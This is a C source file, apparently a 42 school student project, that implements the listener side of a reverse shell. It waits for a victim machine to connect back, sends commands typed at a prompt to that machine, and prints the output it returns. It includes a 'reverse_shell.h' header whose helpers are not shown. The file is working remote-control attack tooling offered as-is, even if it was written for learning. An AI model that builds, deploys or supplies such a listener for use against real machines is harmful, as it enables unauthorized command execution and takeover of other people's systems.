/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   berkeley_server.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 16:00:43 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/10 20:49:33 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include "libft.h"
#include "reverse_shell.h"

int	main(void)
{
	int			server_fd;
	int			client_fd;
	char		*client_ip;
	char		*line;
	uint64_t	linelen;

	printf("Waiting for incomming connections...\n");
	if (berkeley_server_connection(&server_fd, &client_fd, &client_ip) != 0)
	{
		fprintf(stderr, "ERROR [%d]: %s\n", errno, strerror(errno));
		return (1);
	}
	prompt_command(NULL, NULL, client_ip);
	while (prompt_command(&line, &linelen, NULL))
	{
		write(client_fd, line, linelen);
		usleep(500000);
		while (TRUE)
		{
			linelen = ft_getline(&line, client_fd);
			if (line == NULL)
				break ;
			write(STDOUT_FILENO, line, linelen);
		}
	}
	return (close(server_fd), close(client_fd), SUCCESS);
}
